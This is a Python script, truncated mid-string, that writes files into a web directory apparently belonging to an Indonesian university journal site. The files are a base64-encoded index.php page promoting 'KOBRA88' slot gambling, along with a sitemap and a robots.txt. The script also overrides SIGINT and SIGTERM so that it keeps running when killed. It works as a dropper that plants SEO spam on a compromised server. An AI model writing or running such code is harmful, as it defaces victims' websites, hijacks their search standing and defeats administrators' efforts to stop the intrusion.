from __future__ import print_function
import os
import time
import base64
import signal
import sys  # Import the sys module
#nonroot
def signal_handler(signal, frame):
    print('Signal received, but I am not stopping')

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

directory = "/var/www/jurnalfisip/public/site/-/koko303"
file_path_index = os.path.join(directory, "index.php")
file_path_page = os.path.join(directory, "scrowx.php")
file_path_sitemap = os.path.join(directory, "sitemap.xml")
file_path_robots = os.path.join(directory, "robots.txt")
file_content_index = "PCFET0NUWVBFIGh0bWw+CjxodG1sIOKaoSBsYW5nPSJpZCI+CjxoZWFkPiAgICAKICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ii8+CiAgICA8c2NyaXB0IGFzeW5jIHNyYz0iaHR0cHM6Ly9jZG4uYW1wcHJvamVjdC5vcmcvdjAuanMiPjwvc2NyaXB0PgogICAgPHRpdGxlPktPQlJBODg6IFNpdHVzIFNsb3QgR2Fjb3IgQWt1biBQcm8gVGhhaWxhbmQgVGVyYmFydSAyMDIzPC90aXRsZT4KICAgIDxtZXRhIGh0dHAtZXF1aXY9IlgtVUEtQ29tcGF0aWJsZSIgY29udGVudD0iSUU9ZWRnZSIvPgogICAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xLjAsIG1heGltdW0tc2NhbGU9MS4wLCBtaW5pbXVtLXNjYWxlPTEuMCIvPgogICAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IktvYnJhODggYWRhbGFoIFNpdHVzIFNsb3QgZ2Fjb3IgZGVuZ2FuIGFrdW4gcHJvIHRoYWlsYW5kIHRlcmJhcnUgMjAyMyBkaWphbWluIHBhbGluZyBnYW1wYW5nIG1heHdpbiIvPgogICAgPG1ldGEgbmFtZT0iZ29vZ2xlLXNpdGUtdmVyaWZpY2F0aW9uIiBjb250ZW50PSI5S0ZXZGU3SV9ZNVNFVVR4QVo2TEY5NktIVS1iSXVyWEtsTXQ3WEJSZUVZIiAvPgogICAgPG1ldGEgbmFtZT0ia2V5d29yZHMiIGNvbnRlbnQ9ImtvYnJhODgsIHNsb3QgdGhhaWxhbmQsIGFrdW4gcHJvIHRoYWlsYW5kIi8+CiAgICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9InNsb3RnYWNvciIvPgogICAgPG1ldGEgbmFtZT0ibGFuZ3VhZ2UiIGNvbnRlbnQ9ImlkIi8+CiAgICA8bWV0YSBuYW1lPSJyb2JvdHMiIGNvbnRlbnQ9ImluZGV4LCBmb2xsb3ciPgogICAgPGxpbmsgaXRlbXByb3A9Im1haW5FbnRpdHlPZlBhZ2UiIHJlbD0iY2Fub25pY2FsIiBocmVmPSJodHRwczovL2p1cm5hbGZpc2lwLnVpbnNieS5hYy5pZC9wdWJsaWMvc2l0ZS8tL2tvYnJhODgvIiAvPgogICAgPG1ldGEgY29udGVudD0nIzAwMDAwMCcgbmFtZT0ndGhlbWUtY29sb3InIC8+CiAgICA8bGluayByZWw9InByZWxvYWQiIGFzPSJpbWFnZSIgaHJlZj0iaHR0cHM6Ly9pLnBvc3RpbWcuY2Mvd3ZRTlBwSHcvV2VsY29tLUJvbnVzLTExMDAteC0yMTAuanBnIiAvPgogICAgPG1ldGEgbmFtZT0idHdpdHRlcjpjYXJkIiBjb250ZW50PSJzdW1tYXJ5Ij4KICAgIDxtZXRhIG5hbWU9InR3aXR0ZXI6dGl0bGUiIGNvbnRlbnQ9IktPQlJBODg6IFNpdHVzIFNsb3QgR2Fjb3IgQWt1biBQcm8gVGhhaWxhbmQgVGVyYmFydSAyMDIzIj4KICAgIDxtZXRhIG5hbWU9InR3aXR0ZXI6ZGVzY3JpcHRpb24iIGNvbnRlbnQ9IktvYnJhODggYWRhbGFoIFNpdHVzIFNsb3QgZ2Fjb3IgZGVuZ2FuIGFrdW4gcHJvIHRoYWlsYW5kIHRlcmJhcnUgMjAyMyBkaWphbWluIHBhbGluZyBnYW1wYW5nIG1heHdpbiI+CiAgICA8bWV0YSBuYW1lPSJ0d2l0dGVyOmltYWdlOnNyYyIgY29udGVudD0iaHR0cHM6Ly9pLnBvc3RpbWcuY2Mvd3ZRTlBwSHcvV2VsY29tLUJvbnVzLTExMDAteC0yMTAuanBnIj4KICAgIDxtZXRhIG5hbWU9Im9nOnRpdGxlIiBjb250ZW50PSJLT0JSQTg4OiBTaXR1cyBTbG90IEdhY29yIEFrdW4gUHJvIFRoYWlsYW5kIFRlcmJhcnUgMjAyMyI+CiAgICA8bWV0YSBuYW1lPSJvZzpkZXNjcmlwdGlvbiIgY29udGVudD0iS29icmE4OCBhZGFsYWggU2l0dXMgU2xvdCBnYWNvciBkZW5nYW4gYWt1biBwcm8gdGhhaWxhbmQgdGVyYmFydSAyMDIzIGRpamFtaW4gcGFsaW5nIGdhbXBhbmcgbWF4d2luIj4KICAgIDxtZXRhIG5hbWU9Im9nOmltYWdlIiBjb250ZW50PSJodHRwczovL2kucG9zdGltZy5jYy93dlFOUHBIdy9XZWxjb20tQm9udXMtMTEwMC14LTIxMC5qcGciPgogICAgPG1ldGEgcHJvcGVydHk9Im9nOmltYWdlOndpZHRoIiBjb250ZW50PSI2MDAiPgogICAgPG1ldGEgcHJvcGVydHk9Im9nOmltYWdlOmhlaWdodCIgY29udGVudD0iNDY2Ij4KICAgIDxtZXRhIG5hbWU9Im9nOnVybCIgY29udGVudD0iaHR0cHM6Ly9qdXJuYWxmaXNpcC51aW5zYnkuYWMuaWQvcHVibGljL3NpdGUvLS9rb2JyYTg4LyI+CiAgICA8bWV0YSBuYW1lPSJvZzpzaXRlX25hbWUiIGNvbnRlbnQ9IktPQlJBODgiPgogICAgPG1ldGEgbmFtZT0ib2c6bG9jYWxlIiBjb250ZW50PSJJRF9pZCI+CiAgICA8bWV0YSBuYW1lPSJvZzp0eXBlIiBjb250ZW50PSJ3ZWJzaXRlIj4KICAgIDxtZXRhIG5hbWU9InRoZW1lLWNvbG9yIiBjb250ZW50PSIjMDAwMDAwIiAvPgogICAgPG1ldGEgbmFtZT0iY2F0ZWdvcmllcyIgY29udGVudD0iS09CUkE4OCIgLz4KICAgIDxtZXRhIG5hbWU9Imxhbmd1YWdlIiBjb250ZW50PSJJRCI+CiAgICA8bWV0YSBuYW1lPSJyYXRpbmciIGNvbnRlbnQ9ImdlbmVyYWwiPgogICAgPG1ldGEgbmFtZT0iY29weXJpZ2h0IiBjb250ZW50PSJLT0JSQTg4Ij4KICAgIDxtZXRhIG5hbWU9ImF1dGhvciIgY29udGVudD0iS09CUkE4OCI+CiAgICA8bWV0YSBuYW1lPSJkaXN0cmlidXRpb24iIGNvbnRlbnQ9Imdsb2JhbCI+CiAgICA8bWV0YSBuYW1lPSJwdWJsaXNoZXIiIGNvbnRlbnQ9IktPQlJBODgiPgogICAgPG1ldGEgbmFtZT0iZ2VvLnBsYWNlbmFtZSIgY29udGVudD0iREtJIEpha2FydGEiPgogICAgPG1ldGEgbmFtZT0iZ2VvLmNvdW50cnkiIGNvbnRlbnQ9IklEIj4KICAgIDxtZXRhIG5hbWU9Imdlby5yZWdpb24iIGNvbnRlbnQ9IklEIiAvPgogICAgPG1ldGEgbmFtZT0idGduLm5hdGlvbiIgY29udGVudD0iSW5kb25lc2lhIj4KICAgIDxsaW5rIHJlbD0iYXBwbGUtdG91Y2gtaWNvbiIgaHJlZj0iaHR0cHM6Ly9jZG4ucmJ0YXNzZXQuY29tL2Fzc2V0cy90cGwvMGI5OTllNDA5Ny9pbWFnZXMvZmF2aWNvbi5pY28iLz4KICAgIDxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgdHlwZT0iaW1hZ2UvcG5nIiBocmVmPSJodHRwczovL2Nkbi5yYnRhc3NldC5jb20vYXNzZXRzL3RwbC8wYjk5OWU0MDk3L2ltYWdlcy9mYXZpY29uLmljbyIgLz4KICAgIDxsaW5rIGhyZWY9J2h0dHBzOi8vY2RuLnJidGFzc2V0LmNvbS9hc3NldHMvdHBsLzBiOTk5ZTQwOTcvaW1hZ2VzL2Zhdmljb24uaWNvJyByZWw9J2ljb24nIHNpemVzPSczMngzMicgdHlwZT0naW1hZ2UvcG5nJyAvPgogICAgPCEtLSAgSW5pIGFkYWxhaCBTY3JpcHQgZGlhdGFzIHdlYiBndW5hIHVudHVrIHRhcnVoIEdvb2dsZSBNZXRhIHRhZyBkbGwgdW50dWsgU0VPLCBHeCBzZW11YSBzY3JpcHQgYmVrZXJqYSBkaSBBTVAgLS0+ICAgIDxzdHlsZSBhbXAtYm9pbGVycGxhdGU+Ym9keXstd2Via2l0LWFuaW1hdGlvbjotYW1wLXN0YXJ0IDhzIHN0ZXBzKDEsZW5kKSAwcyAxIG5vcm1hbCBib3RoOy1tb3otYW5pbWF0aW9uOi1hbXAtc3RhcnQgOHMgc3RlcHMoMSxlbmQpIDBzIDEgbm9ybWFsIGJvdGg7LW1zLWFuaW1hdGlvbjotYW1wLXN0YXJ0IDhzIHN0ZXBzKDEsZW5kKSAwcyAxIG5vcm1hbCBib3RoO2FuaW1hdGlvbjotYW1wLXN0YXJ0IDhzIHN0ZXBzKDEsZW5kKSAwcyAxIG5vcm1hbCBib3RofUAtd2Via2l0LWtleWZyYW1lcyAtYW1wLXN0YXJ0e2Zyb217dmlzaWJpbGl0eTpoaWRkZW59dG97dmlzaWJpbGl0eTp2aXNpYmxlfX1ALW1vei1rZXlmcmFtZXMgLWFtcC1zdGFydHtmcm9te3Zpc2liaWxpdHk6aGlkZGVufXRve3Zpc2liaWxpdHk6dmlzaWJsZX19QC1tcy1rZXlmcmFtZXMgLWFtcC1zdGFydHtmcm9te3Zpc2liaWxpdHk6aGlkZGVufXRve3Zpc2liaWxpdHk6dmlzaWJsZX19QC1vLWtleWZyYW1lcyAtYW1wLXN0YXJ0e2Zyb217dmlzaWJpbGl0eTpoaWRkZW59dG97dmlzaWJpbGl0eTp2aXNpYmxlfX1Aa2V5ZnJhbWVzIC1hbXAtc3RhcnR7ZnJvbXt2aXNpYmlsaXR5OmhpZGRlbn10b3t2aXNpYmlsaXR5OnZpc2libGV9fTwvc3R5bGU+PG5vc2NyaXB0PjxzdHlsZSBhbXAtYm9pbGVycGxhdGU+Ym9keXstd2Via2l0LWFuaW1hdGlvbjpub25lOy1tb3otYW5pbWF0aW9uOm5vbmU7LW1zLWFuaW1hdGlvbjpub25lO2FuaW1hdGlvbjpub25lfTwvc3R5bGU+PC9ub3NjcmlwdD4KICAgIDxzY3JpcHQgYXN5bmMgY3VzdG9tLWVsZW1lbnQ9ImFtcC1zaWRlYmFyIiBzcmM9Imh0dHBzOi8vY2RuLmFtcHByb2plY3Qub3JnL3YwL2FtcC1zaWRlYmFyLTAuMS5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0IGFzeW5jIGN1c3RvbS1lbGVtZW50PSJhbXAtYW5hbHl0aWNzIiBzcmM9Imh0dHBzOi8vY2RuLmFtcHByb2plY3Qub3JnL3YwL2FtcC1hbmFseXRpY3MtMC4xLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgYXN5bmMgY3VzdG9tLWVsZW1lbnQ9ImFtcC1jYXJvdXNlbCIgc3JjPSJodHRwczovL2Nkbi5hbXBwcm9qZWN0Lm9yZy92MC9hbXAtY2Fyb3VzZWwtMC4xLmpzIj48L3NjcmlwdD4KICAgIDxzY3JpcHQgYXN5bmMgY3VzdG9tLWVsZW1lbnQ9ImFtcC1hY2NvcmRpb24iIHNyYz0iaHR0cHM6Ly9jZG4uYW1wcHJvamVjdC5vcmcvdjAvYW1wLWFjY29yZGlvbi0wLjEuanMiPjwvc2NyaXB0PgogICAgPHNjcmlwdCBhc3luYyBjdXN0b20tZWxlbWVudD0iYW1wLWlmcmFtZSIgc3JjPSJodHRwczovL2Nkbi5hbXBwcm9qZWN0Lm9yZy92MC9hbXAtaWZyYW1lLTAuMS5qcyI+PC9zY3JpcHQ+CiAgICA8c3R5bGUgYW1wLWN1c3RvbT4KICAgIAlib2R5e2JhY2tncm91bmQ6IzE2MWEyNTtib3gtc2l6aW5nOmJvcmRlci1ib3h9aGVhZGVye3Bvc2l0aW9uOmZpeGVkO3dpZHRoOjEwMCU7dGV4dC1hbGlnbjpjZW50ZXI7Ym9yZGVyLWJvdHRvbToycHggc29saWQgI2ZjY2QwNjtib3JkZXItcmFkaXVzOjEwcHg7YmFja2dyb3VuZDojMDAwO3otaW5kZXg6OTk5fWF7dGV4dC1kZWNvcmF0aW9uOm5vbmU7Y29sb3I6I2ZmZn1hLGJvZHksZGl2LGgxLGgyLGgzLGg0LGh0bWwscCxzcGFue21hcmdpbjowO3BhZGRpbmc6MDtib3JkZXI6MDtmb250LXNpemU6MTAwJTtmb250LWZhbWlseTotYXBwbGUtc3lzdGVtLHN5c3RlbS11aSxCbGlua01hY1N5c3RlbUZvbnQsIlNlZ29lIFVJIixSb2JvdG8sIkhlbHZldGljYSBOZXVlIixBcmlhbCxzYW5zLXNlcmlmO3ZlcnRpY2FsLWFsaWduOmJhc2VsaW5lfWg0e3BhZGRpbmc6MCAxMHB4fS5jb250ZW50LWNvbnRhaW5lcntwYWRkaW5nOjc1cHggMTVweCAwO21heC13aWR0aDo3MjBweDttYXJnaW46YXV0b30uYnV0dG9uLWNvbnRhaW5lcntkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW59LmJ1dHRvbi1jb250YWluZXIgLmJ1dHRvbnt3aWR0aDo0OCV9LnRyb24tbG9naW57LXdlYmtpdC1ib3JkZXItcmFkaXVzOjA7LW1vei1ib3JkZXItcmFkaXVzOjA7Ym9yZGVyLXJhZGl1czo1cHg7Y29sb3I6I2ZmZjtmb250LWZhbWlseTotYXBwbGUtc3lzdGVtLHN5c3RlbS11aSxCbGlua01hY1N5c3RlbUZvbnQsIlNlZ29lIFVJIixSb2JvdG8sIkhlbHZldGljYSBOZXVlIixBcmlhbCxzYW5zLXNlcmlmO2ZvbnQtc2l6ZTpjYWxjKDEycHgrMXZoKTtmb250LXN0eWxlOm5vcm1hbDtmb250LXZhcmlhbnQ6bm9ybWFsO2ZvbnQtd2VpZ2h0OjcwMDtsaW5lLWhlaWdodDoyM3B4O3BhZGRpbmc6MTBweDtiYWNrZ3JvdW5kLWNvbG9yOiMwMDdiZmY7LXdlYmtpdC1ib3gtc2hhZG93OjFweCAxcHggMTVweCAwICMwMDdiZmY7LW1vei1ib3gtc2hhZG93OjFweCAxcHggMTVweCAwICMwMDdiZmY7Ym94LXNoYWRvdzoxcHggMXB4IDE1cHggMCAjMDA3YmZmO2JvcmRlcjpzb2xpZCAjMDA2Yjk2IDNweDt0ZXh0LWRlY29yYXRpb246bm9uZTtkaXNwbGF5OmZsZXg7Y3Vyc29yOnBvaW50ZXI7dGV4dC1hbGlnbjpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcn0udHJvbi1yZWdpc3std2Via2l0LWJvcmRlci1yYWRpdXM6MDstbW96LWJvcmRlci1yYWRpdXM6MDtib3JkZXItcmFkaXVzOjVweDtjb2xvcjojZmZmO2ZvbnQtZmFtaWx5Oi1hcHBsZS1zeXN0ZW0sc3lzdGVtLXVpLEJsaW5rTWFjU3lzdGVtRm9udCwiU2Vnb2UgVUkiLFJvYm90bywiSGVsdmV0aWNhIE5ldWUiLEFyaWFsLHNhbnMtc2VyaWY7Zm9udC1zaXplOmNhbGMoMTJweCsxdmgpO2ZvbnQtc3R5bGU6bm9ybWFsO2ZvbnQtdmFyaWFudDpub3JtYWw7Zm9udC13ZWlnaHQ6NzAwO2xpbmUtaGVpZ2h0OjI0cHg7cGFkZGluZzoxMXB4O2JhY2tncm91bmQ6cmFkaWFsLWdyYWRpZW50KGNpcmNsZSAyMTRweCBhdCA0Ni41JSA1NC4yJSwjZGMzNTQ1IDAsIzdhMWMyNSA5NiUpO2NvbG9yOiNmZmY7dGV4dC1kZWNvcmF0aW9uOm5vbmU7ZGlzcGxheTpmbGV4O2N1cnNvcjpwb2ludGVyO3RleHQtYWxpZ246Y2VudGVyO2p1c3RpZnktY29udGVudDpjZW50ZXJ9LnRyb24tcmVnaXN7YW5pbWF0aW9uOmJsaW5raW5ncyAxcyBpbmZpbml0ZTt0cmFuc2l0aW9uOmFsbCAuNHM7dG91Y2gtYWN0aW9uOm1hbmlwdWxhdGlvbjtjdXJzb3I6cG9pbnRlcn0uYnRue2Rpc3BsYXk6aW5saW5lLWJsb2NrO3BhZGRpbmc6NnB4IDEycHg7dG91Y2gtYWN0aW9uOm1hbmlwdWxhdGlvbjtjdXJzb3I6cG9pbnRlcjt1c2VyLXNlbGVjdDpub25lO2JhY2tncm91bmQtaW1hZ2U6bm9uZTtib3JkZXI6MXB4IHNvbGlkIHRyYW5zcGFyZW50O2JvcmRlci1yYWRpdXM6NXB4O2ZvbnQ6MjUwIDE2cHggQXJpYWwsIkhlbHZldGljYSBOZXVlIixIZWx2ZXRpY2Esc2Fucy1zZXJpZjt3aWR0aDoxMDAlO2NvbG9yOiNmZmY7dGV4dC1zaGFkb3c6MCAwIDNweCAjMDAwO2xldHRlci1zcGFjaW5nOjEuMXB4fS5idG4tZGFme21hcmdpbjozMHB4IDAgMzBweCAwO2JhY2tncm91bmQ6cmFkaWFsLWdyYWRpZW50KGNpcmNsZSAyMTRweCBhdCA0Ni41JSA1NC4yJSwjZmNjZDA2IDAsIzAwMCA5NiUpO2FuaW1hdGlvbjpibGlua2luZyAuNXMgaW5maW5pdGU7dHJhbnNpdGlvbjphbGwgLjRzfS5qYWNrcG90e21hcmdpbjoyMHB4IDAgMDtib3JkZXI6MnB4IHNvbGlkICNmY2NkMDY7Ym9yZGVyLXJhZGl1czo0cHg7Ym94LXNoYWRvdzowIDAgM3B4IDAgIzAwZn0udHJvbnstd2Via2l0LWJvcmRlci1yYWRpdXM6MDstbW96LWJvcmRlci1yYWRpdXM6MDtib3JkZXItcmFkaXVzOjVweDtjb2xvcjojZmZmO2ZvbnQtZmFtaWx5Oi1hcHBsZS1zeXN0ZW0sc3lzdGVtLXVpLEJsaW5rTWFjU3lzdGVtRm9udCwiU2Vnb2UgVUkiLFJvYm90bywiSGVsdmV0aWNhIE5ldWUiLEFyaWFsLHNhbnMtc2VyaWY7Zm9udC1zaXplOmNhbGMoOHB4KzF2aCk7Zm9udC1zdHlsZTpub3JtYWw7Zm9udC12YXJpYW50Om5vcm1hbDtmb250LXdlaWdodDo3MDA7bGluZS1oZWlnaHQ6MTVweDtwYWRkaW5nOjEwcHg7YmFja2dyb3VuZDpyYWRpYWwtZ3JhZGllbnQoY2lyY2xlIDIxNHB4IGF0IDQ2LjUlIDU0LjIlLCNmY2NkMDYgMCwjMDAwIDk2JSk7LXdlYmtpdC1ib3gtc2hhZG93OjFweCAxcHggMTBweCAwICNmY2NkMDY7LW1vei1ib3gtc2hhZG93OjFweCAxcHggMTBweCAwICNmY2NkMDY7Ym94LXNoYWRvdzoxcHggMXB4IDEwcHggMCAjZmNjZDA2O2JvcmRlcjpzb2xpZCAjZmNjZDA2IDJweDt0ZXh0LWRlY29yYXRpb246bm9uZTtkaXNwbGF5OmZsZXg7Y3Vyc29yOnBvaW50ZXI7dGV4dC1hbGlnbjpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjttYXJnaW46MTBweCAwIDEwcHggMH0udHJvbjpob3ZlcntiYWNrZ3JvdW5kOiMwMDA7Ym9yZGVyOnNvbGlkICNmY2NkMDYgNXB4Oy13ZWJraXQtYm9yZGVyLXJhZGl1czowOy1tb3otYm9yZGVyLXJhZGl1czowO2JvcmRlci1yYWRpdXM6MDt0ZXh0LWRlY29yYXRpb246bm9uZX0ubWVudS1jb250YWluZXJ7ZGlzcGxheTpmbGV4O2ZsZXgtd3JhcDp3cmFwO2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVufS5tZW51LWNvbnRhaW5lciAubWVudS1pdGVte3dpZHRoOjIzJX10YWJsZS5zbG90Z2Fjb3J7Zm9udC1mYW1pbHk6LWFwcGxlLXN5c3RlbSxzeXN0ZW0tdWksQmxpbmtNYWNTeXN0ZW1Gb250LCJTZWdvZSBVSSIsUm9ib3RvLCJIZWx2ZXRpY2EgTmV1ZSIsQXJpYWwsc2Fucy1zZXJpZjt3aWR0aDoxMDAlO3RleHQtYWxpZ246bGVmdDtib3JkZXItY29sbGFwc2U6Y29sbGFwc2U7Zm9udC1zaXplOmNhbGMoOHB4KzF2aCk7bWFyZ2luOjAgMjBweCAwIDB9dGFibGUuc2xvdGdhY29yIHRoZWFke2JhY2tncm91bmQ6I2ZjY2QwNn10YWJsZS5zbG90Z2Fjb3IgdGhlYWQgdGh7Zm9udC1zaXplOmNhbGMoMTJweCsxdmgpO2ZvbnQtd2VpZ2h0OjcwMDtjb2xvcjojZmZmO3RleHQtYWxpZ246Y2VudGVyO2JhY2tncm91bmQ6cmFkaWFsLWdyYWRpZW50KGNpcmNsZSAyMTRweCBhdCA0Ni41JSA1NC4yJSwjZmNjZDA2IDAsIzAwMCA5NiUpfXRhYmxlLnNsb3RnYWNvciB0ZCx0YWJsZS5zbG90Z2Fjb3IgdGh7Ym9yZGVyOjFweCBzb2xpZCAjZmNjZDA2O3BhZGRpbmc6MTBweCA1cHggMTBweH10YWJsZS5zbG90Z2Fjb3IgdGQsdGFibGUuc2xvdGdhY29yIHRoe2JvcmRlcjoxcHggc29saWQgI2ZjY2QwNjtwYWRkaW5nOjEwcHggNXB4IDEwcHh9dGFibGUuc2xvdGdhY29yIHRib2R5IHRke2ZvbnQtc2l6ZTpjYWxjKDhweCsxdmgpO2ZvbnQtd2VpZ2h0OjUwMDtjb2xvcjojYmZiZmJmfXB7bWFyZ2luLXRvcDowO21hcmdpbi1ib3R0b206MXJlbX0uc2l0ZS1kZXNjcmlwdGlvbnt0ZXh0LWFsaWduOmxlZnQ7cGFkZGluZzoxMHB4O2NvbG9yOiNmY2NkMDY7Ym9yZGVyLXJhZGl1czo1cHg7Ym94LXNoYWRvdzowIDAgOHB4IDRweCAjZmNjZDA2O21hcmdpbjoyMHB4IDAgMH0uc2l0ZS1kZXNjcmlwdGlvbiBwe2ZvbnQtZmFtaWx5Oi1hcHBsZS1zeXN0ZW0sc3lzdGVtLXVpLEJsaW5rTWFjU3lzdGVtRm9udCwiU2Vnb2UgVUkiLFJvYm90bywiSGVsdmV0aWNhIE5ldWUiLEFyaWFsLHNhbnMtc2VyaWY7Zm9udC1zaXplOjE2cHg7Zm9udC1zdHlsZTpub3JtYWw7Zm9udC12YXJpYW50Om5vcm1hbDtmb250LXdlaWdodDo0MDA7bGluZS1oZWlnaHQ6MjNweDtwYWRkaW5nOjAgMTBweDtjb2xvcjojZmZmfXAjYnJlYWRjcnVtYnN7Y29sb3I6I2ZmZjt0ZXh0LWFsaWduOmNlbnRlcn0uc2l0ZS1kZXNjcmlwdGlvbiBocnttYXJnaW46MTBweCAwIDEwcHggMDtjb2xvcjojZmNjZDA2O2JvcmRlcjoxcHggc29saWQgI2ZjY2QwNn0uc2l0ZS1kZXNjcmlwdGlvbiBhe2NvbG9yOiNmY2NkMDZ9LnRyb24taW1hZ2Vzey13ZWJraXQtYm9yZGVyLXJhZGl1czowOy1tb3otYm9yZGVyLXJhZGl1czowO2JvcmRlci1yYWRpdXM6NXB4O2NvbG9yOiNmY2NkMDY7LXdlYmtpdC1ib3gtc2hhZG93OjFweCAxcHggMTBweCAwICNmY2NkMDY7LW1vei1ib3gtc2hhZG93OjFweCAxcHggMTBweCAwICNmY2NkMDY7Ym94LXNoYWRvdzoxcHggMXB4IDEwcHggMCAjZmNjZDA2O2Rpc3BsYXk6YmxvY2s7Y3Vyc29yOnBvaW50ZXI7dGV4dC1hbGlnbjpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjt3aWR0aDoxMDAlO2hlaWdodDphdXRvO21hcmdpbi1yaWdodDphdXRvO21hcmdpbi1sZWZ0OmF1dG99LnNpdGUtZGVzY3JpcHRpb24gaDF7Zm9udC1mYW1pbHk6LWFwcGxlLXN5c3RlbSxzeXN0ZW0tdWksQmxpbmtNYWNTeXN0ZW1Gb250LCJTZWdvZSBVSSIsUm9ib3RvLCJIZWx2ZXRpY2EgTmV1ZSIsQXJpYWwsc2Fucy1zZXJpZjtmb250LXNpemU6MmVtO2ZvbnQtc3R5bGU6bm9ybWFsO2ZvbnQtdmFyaWFudDpub3JtYWw7Zm9udC13ZWlnaHQ6NTAwO2NvbG9yOiNmY2NkMDY7bWFyZ2luOjIwcHggMCAyMHB4IDA7dGV4dC1hbGlnbjpjZW50ZXJ9LnNpdGUtZGVzY3JpcHRpb24gaDJ7Zm9udC1mYW1pbHk6LWFwcGxlLXN5c3RlbSxzeXN0ZW0tdWksQmxpbmtNYWNTeXN0ZW1Gb250LCJTZWdvZSBVSSIsUm9ib3RvLCJIZWx2ZXRpY2EgTmV1ZSIsQXJpYWwsc2Fucy1zZXJpZjtmb250LXNpemU6MS41ZW07Zm9udC1zdHlsZTpub3JtYWw7Zm9udC12YXJpYW50Om5vcm1hbDtmb250LXdlaWdodDo1MDA7bGluZS1oZWlnaHQ6MjNweDtjb2xvcjojZmNjZDA2O21hcmdpbjoyMHB4IDAgMjBweCAwO3RleHQtYWxpZ246Y2VudGVyfS5zaXRlLWRlc2NyaXB0aW9uIGgze2ZvbnQtZmFtaWx5Oi1hcHBsZS1zeXN0ZW0sc3lzdGVtLXVpLEJsaW5rTWFjU3lzdGVtRm9udCwiU2Vnb2UgVUkiLFJvYm90bywiSGVsdmV0aWNhIE5ldWUiLEFyaWFsLHNhbnMtc2VyaWY7Zm9udC1zaXplOjEuMjVlbTtmb250LXN0eWxlOm5vcm1hbDtmb250LXZhcmlhbnQ6bm9ybWFsO2ZvbnQtd2VpZ2h0OjUwMDtsaW5lLWhlaWdodDoyM3B4O2NvbG9yOiNmY2NkMDY7bWFyZ2luOjIwcHggMCAyMHB4IDA7cGFkZGluZzoxMHB4IDEwcHggMTBweCAxMHB4fS5zaXRlLWRlc2NyaXB0aW9uIGxpe21hcmdpbjo1cHggMzBweCAxMHB4O3RleHQtYWxpZ246anVzdGlmeTtjb2xvcjojZmZmfS5hY2NvcmRpb24gaDR7Zm9udC1zaXplOjE3cHg7bGluZS1oZWlnaHQ6MjhweDtiYWNrZ3JvdW5kLWNvbG9yOnRyYW5zcGFyZW50O2JvcmRlcjowfXNwYW4uZmFxLWFycm93e2Zsb2F0OnJpZ2h0O2NvbG9yOiNmZmZ9LmNvcHlsZWZ0e3RleHQtZGVjb3JhdGlvbjpub25lO2NvbG9yOiNmZmY7bWFyZ2luOjM1cHggMH0uY29weWxlZnQgYXtjb2xvcjojMDA3YmZmfS5mb290ZXJ7dGV4dC1hbGlnbjpjZW50ZXJ9LnNfZm9vdGVye2Rpc3BsYXk6bm9uZX0uc19mb290ZXIgYXt0ZXh0LWRlY29yYXRpb246bm9uZX0uYm90dG9tLW1lbnV7cG9zaXRpb246Zml4ZWQ7Ym90dG9tOjA7d2lkdGg6MTAwJTtwYWRkaW5nLXRvcDo1cHg7cGFkZGluZy1ib3R0b206NXB4O2Rpc3BsYXk6Z3JpZDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KDUsMWZyKTtoZWlnaHQ6NjBweDtiYWNrZ3JvdW5kLWNvbG9yOiMxNDA5MDk7YmFja2dyb3VuZC1pbWFnZTp1cmwoaHR0cHM6Ly9pLnBvc3RpbWcuY2MvM3d0c1FkZFovbmF2LWxpbmVzLnBuZyk7Ym9yZGVyLXRvcDoycHggc29saWQgI2ZjY2QwNjtib3JkZXItcmFkaXVzOjEwcHg7anVzdGlmeS1jb250ZW50OnNwYWNlLWFyb3VuZDthbGlnbi1pdGVtczpjZW50ZXI7ei1pbmRleDoxfS5ib3R0b20tbWVudSAubWVudS1pdGVte3RleHQtYWxpZ246Y2VudGVyO3otaW5kZXg6Mn0uc2hha2V7LXdlYmtpdC1hbmltYXRpb24tbmFtZTpzaGFrZTthbmltYXRpb24tbmFtZTpzaGFrZTstd2Via2l0LWFuaW1hdGlvbi1kdXJhdGlvbjo0LjVzO2FuaW1hdGlvbi1kdXJhdGlvbjoxLjVzOy13ZWJraXQtYW5pbWF0aW9uLWZpbGwtbW9kZTpib3RoO2FuaW1hdGlvbi1maWxsLW1vZGU6Ym90aDthbmltYXRpb24taXRlcmF0aW9uLWNvdW50OmluZmluaXRlfS5sYy1mcmFtZXtwb3NpdGlvbjpmaXhlZDtib3R0b206NDcwcHg7cmlnaHQ6MDt6LWluZGV4OjEwMDtoZWlnaHQ6MH0ubGNmY3tiYWNrZ3JvdW5kOiMzNThhZDk7cGFkZGluZzoxMHB4IDIwcHg7cG9zaXRpb246cmVsYXRpdmU7dG9wOjQyOHB4O2JvcmRlci1yYWRpdXM6MjBweCAyMHB4IDAgMDtjdXJzb3I6cG9pbnRlcn0ubGNmb3twb3NpdGlvbjpyZWxhdGl2ZTt0ZXh0LWFsaWduOmNlbnRlcjt3aWR0aDoyMHB4O2hlaWdodDoyMHB4O2xlZnQ6MjkwcHg7Zm9udC1zaXplOjUwcHg7bGluZS1oZWlnaHQ6MTBweDt0b3A6MzhweDt6LWluZGV4OjEwMDtjdXJzb3I6cG9pbnRlcn0uZ3JheXtiYWNrZ3JvdW5kOiMyZjJmMmY7Y29sb3I6I2ZmZn1hbXAtaWZyYW1lIGFtcC1pbWd7YmFja2dyb3VuZC1jb2xvcjojMmYyZjJmfUBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDo5OTJweCl7LmxjZmN7dG9wOjM1NnB4fS5zX2